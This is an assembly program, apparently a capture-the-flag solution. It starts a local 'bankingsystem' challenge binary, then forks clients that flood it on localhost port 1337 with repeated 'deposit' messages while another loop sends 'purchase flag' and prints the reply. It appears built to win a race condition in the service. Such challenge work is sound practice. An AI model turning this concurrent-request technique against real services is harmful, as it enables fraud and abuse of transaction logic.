.globl _start
.intel_syntax noprefix

_start:
	// fork
	mov rax, 57
	syscall

	cmp rax, 0
	je child

parent:
	// execve('bankingsystem', ['',''])
	lea rdi, [rip+program]
	xor esi, esi
	mov rdx, 0
	mov rax, 59
	syscall
	
child:
	// sleep(1)
	mov rax, 1
	mov [rsp+0x10], rax
	mov [rsp+0x18], rax
	lea rdi, [rsp+0x10]
	mov rax, 35
	syscall

	// fork
	mov rax, 57
	syscall
	cmp rax, 0
	je client

	// fork
	mov rax, 57
	syscall
	cmp rax, 0
	je client

purchase:
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    mov rax, 41
    syscall
    mov [rsp+0x50], rax
    mov rdi, [rsp+0x50]
    mov eax, 2
    mov word ptr [rsp+0x30], ax
    mov eax, 0x3905
    mov word ptr [rsp+0x32], ax
    mov eax, 0x0100007f
    mov [rsp+0x34], eax
    mov rsi, rsp
    add rsi, 0x30
    mov rdx, 0x10
    mov rax, 42
    syscall

    mov rdi, [rsp+0x50]
    lea rsi, [rip+flag]
    mov rdx, 13
    mov r10, 0x800
    mov r8, rsp
    add r8, 0x30
    mov r9, 16
    mov rax, 44
    syscall

	mov rdi, [rsp+0x50]
    lea rsi, [rsp+0x200]
    mov rdx, 0x17
    mov r8, rsp
    add r8, 0x30
    mov r9, 16    
    mov rax, 45
    syscall

    mov rdi, 2
    lea rsi, [rsp+0x200]
    mov rdx, 0x17
    mov rax, 1
    syscall
    jmp purchase



client:
	// socket(2, 1, 0)
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    mov rax, 41
    syscall
    mov [rsp+0x50], rax

    // connect
    mov rdi, [rsp+0x50]

    // struct
    // sock_add family
    mov eax, 2
    mov word ptr [rsp+0x30], ax

    mov eax, 0x3905
    mov word ptr [rsp+0x32], ax
    // host
    mov eax, 0x0100007f
    mov [rsp+0x34], eax

    mov rsi, rsp
    add rsi, 0x30
    mov rdx, 0x10
    mov rax, 42
    syscall

    // sendto
sendto:
    mov rdi, [rsp+0x50]
    lea rsi, [rip+deposit]
    mov rdx, 8
    mov r8, rsp
    add r8, 0x30
    mov r9, 16
    mov rax, 44
    syscall

    mov rdi, [rsp+0x50]
    lea rsi, [rsp+0x100]
    mov rdx, 0x40
    mov r8, rsp
    add r8, 0x30
    mov r9, 16    
    mov rax, 45
    syscall

    jmp client



program:
.string "bankingsystem"

deposit:
.string "deposit\n"

flag:
.string "purchase flag"
